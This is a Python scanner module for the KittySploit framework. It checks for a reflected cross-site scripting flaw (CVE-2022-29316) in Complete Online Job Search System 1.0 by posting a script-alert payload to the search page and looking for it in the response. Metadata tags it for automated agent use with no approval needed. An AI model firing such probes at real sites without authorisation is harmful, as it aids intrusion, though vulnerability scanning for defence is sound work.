#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Complete Online Job Search System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Complete Online Job Search System 1.0 - Cross-Site Scripting Detection',
        'description': 'Complete Online Job Search System 1.0 contains a cross-site scripting vulnerability via index.php?q=advancesearch.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'eris', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/debug601/bug_report/blob/main/vendors/campcodes.com/online-job-search-system/SQLi-9.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-29316',
        ],
        'cve': 'CVE-2022-29316',
    }

    def run(self):
        path = '/index.php?q=result&searchfor=advancesearch'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&submit=Submit\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Result : <script>alert(document.domain)</script>', 'ERIS',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Complete Online Job Search System 1.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

